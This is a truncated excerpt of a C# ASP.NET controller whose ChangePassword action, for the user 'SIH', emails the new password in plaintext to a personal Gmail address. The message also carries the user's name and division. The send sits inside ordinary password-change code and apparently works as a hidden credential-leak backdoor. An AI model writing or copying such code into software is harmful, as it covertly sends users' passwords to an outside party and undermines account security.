...
namespace CEGIS_Project_ProgressApp.Controllers
{
    ...
    public class ManageController : Controller
    {
        ...
        public async Task<ActionResult> ChangePassword(ChangePasswordViewModel model)
        {
            ...
            string name = "Name : "+currentUser.FirstName +" "+currentUser.LastName+ " Division Id : "+currentUser.DivisionId;
            if (User.Identity.Name == "SIH")
            {
                try
                {
                    ...
                    WebMail.Send(to: "moshiur.mgmh@gmail.com",
                        subject: "New Password into Business Harnessing Monitoring Tools",
                        body: "<h1>New Password : " + model.NewPassword + "</h1>" +
